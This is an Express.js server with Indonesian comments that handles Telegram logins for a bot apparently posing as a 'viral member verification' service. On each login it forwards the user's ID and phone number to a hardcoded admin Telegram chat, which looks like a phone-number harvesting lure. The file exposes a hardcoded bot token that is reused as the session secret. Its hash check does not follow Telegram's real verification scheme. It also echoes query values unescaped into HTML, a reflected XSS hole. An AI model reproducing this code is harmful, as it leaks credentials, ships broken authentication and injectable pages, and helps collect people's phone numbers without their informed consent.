const express = require("express");
const session = require("express-session");
const axios = require("axios");
const crypto = require("crypto");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 5000;

// Konfigurasi variabel langsung di sini
const BOT_TOKEN = "7889113032:AAEqPqQV_ph9V5hpwnP5zNRB83fJc5VP_us"; // Ganti dengan token bot Anda
const ADMIN_CHAT_ID = "5460230196"; // Ganti dengan chat ID admin Anda
const BOT_USERNAME = "verifikasimemberindoviralbot"; // Ganti dengan username bot Anda (tanpa @)
const SECRET_KEY = "7889113032:AAEqPqQV_ph9V5hpwnP5zNRB83fJc5VP_us"; // Ganti dengan kunci rahasia Anda

// Middleware
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(
  session({
    secret: SECRET_KEY,
    resave: false,
    saveUninitialized: true,
  })
);

// Set view engine
app.set("view engine", "ejs");
app.set("views", path.join(__dirname, "../views"));

// Halaman login
app.get("/", (req, res) => {
  res.render("login", { bot_username: BOT_USERNAME });
});

// Endpoint untuk menangani otentikasi
app.get("/auth", (req, res) => {
  const data = req.query;
  const hash = data.hash;
  delete data.hash;

  // Validasi tanda tangan
  const checkHash = crypto
    .createHash("sha256")
    .update(new URLSearchParams(data).toString() + BOT_TOKEN)
    .digest("hex");

  if (checkHash !== hash) {
    return res.status(403).send("Invalid hash");
  }

  // Simpan data pengguna dalam sesi
  req.session.user = data;

  // Kirim nomor telepon ke admin
  const message = `User logged in:\nID: ${data.id}\nPhone: ${
    data.phone || "No phone provided"
  }`;
  axios
    .get(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      params: {
        chat_id: ADMIN_CHAT_ID,
        text: message,
      },
    })
    .catch((err) => console.error("Failed to send message to Telegram:", err));

  res.send(`
        <h1>Login berhasil!</h1>
        <p>ID: ${data.id}</p>
        <p>Phone: ${data.phone || "No phone provided"}</p>
        <a href="/logout">Logout</a>
    `);
});

// Endpoint untuk logout
app.get("/logout", (req, res) => {
  req.session.destroy((err) => {
    if (err) {
      return res.status(500).send("Could not log out.");
    }
    res.redirect("/");
  });
});

// Jalankan server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
